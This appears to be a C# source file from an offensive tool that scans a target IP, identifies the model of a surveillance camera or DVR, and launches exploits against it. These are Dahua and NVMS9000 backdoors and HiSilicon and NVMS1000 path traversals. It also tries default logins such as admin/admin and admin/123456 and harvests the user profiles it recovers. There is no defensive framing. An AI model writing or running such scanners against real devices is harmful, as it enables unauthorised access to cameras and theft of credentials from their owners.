using System;
using System.IO;
using System.Net;
using System.Threading;

using Anotarity.Models;
using Anotarity.Profiles;
using Anotarity.BruteForce;

namespace Anotarity.Exploits
{
    public class ExploitScanner
    {
        IPEndPoint Target;

        public delegate void ModelFoundEventDelegate(Model Model);
        public delegate void ExploitFoundEventDelegate(Exploit Exploit);
        public delegate void CredentialsFoundEventDelegate(String Username, String Password);

        public ExploitType[] Exploits = new ExploitType[0];
        public Profile[] Profiles = new Profile[0];
        public String SerialNum, Info;
        public String[] CameraList;
        public Model DeviceModel = Model.None;

        public ExploitScanner(IPEndPoint Target)
        {
            this.Target = Target;
        }

        private void AddExploit(ExploitType Type)
        {
            Array.Resize(ref Exploits, Exploits.Length + 1);
            Exploits[Exploits.Length - 1] = Type;
        }

        private void AddProfile(Profile Profile)
        {
            Array.Resize(ref Profiles, Profiles.Length + 1);
            Profiles[Profiles.Length - 1] = Profile;
        }

        public Boolean IsExploitPresent(ExploitType Type)
        {
            for (Int32 i = 0; i < Exploits.Length; i++)
                if (Exploits[i] == Type) return true;
            return false;
        }

        public void Scan(Boolean TryCredentials)
        {
            ModelScanner Scanner = new ModelScanner();
            Model MScan = Scanner.Scan(Target);
            this.DeviceModel = MScan;

            LoginMaker Login = new LoginMaker(Target, MScan);

            if (MScan == Model.Dahua)
            {
                DahuaBackdoor Backdoor;
                Boolean BackdoorResult = DahuaBackdoor.TryPerform(Target, out Backdoor);
                if (BackdoorResult)
                {
                    AddExploit(ExploitType.DahuaBackdoor);
                    Profiles = Backdoor.Profiles;
                    SerialNum = Backdoor.SerialNum;
                }
                if (TryCredentials && Login.TryLogin("admin", "admin"))
                {
                    AddProfile(new Profile("admin", "admin"));
                }
            }

            if (MScan == Model.HiSilicon)
            {
                HiSiliconPathTraversal PathTraversal;
                Boolean TraversalResult = HiSiliconPathTraversal.TryPerform(Target, out PathTraversal);
                if (TraversalResult)
                {
                    AddExploit(ExploitType.HiSiliconPathTraversal);
                    Profiles = PathTraversal.Profiles;
                }
            }

            if (MScan == Model.NVMS1000)
            {
                NVMS1000PathTraversal PathTraversal;
                Boolean TraversalResult = NVMS1000PathTraversal.TryPerform(Target, out PathTraversal);
                if (TraversalResult)
                {
                    AddExploit(ExploitType.NVMS1000PathTraversal);
                    Profiles = PathTraversal.Profiles;
                }
                if (!TraversalResult && TryCredentials && Login.TryLogin("admin", "123456"))
                {
                    AddProfile(new Profile("admin", "123456"));
                }
            }

            if (MScan == Model.NVMS9000)
            {
                NVMS9000Backdoor Backdoor;
                Boolean BackdoorResult = NVMS9000Backdoor.TryPerform(Target, out Backdoor);
                if (BackdoorResult)
                {
                    AddExploit(ExploitType.NVMS9000Backdoor);
                }
                if (TryCredentials && Login.TryLogin("admin", "123456"))
                {
                    AddProfile(new Profile("admin", "123456"));
                }
            }
        }
    }
}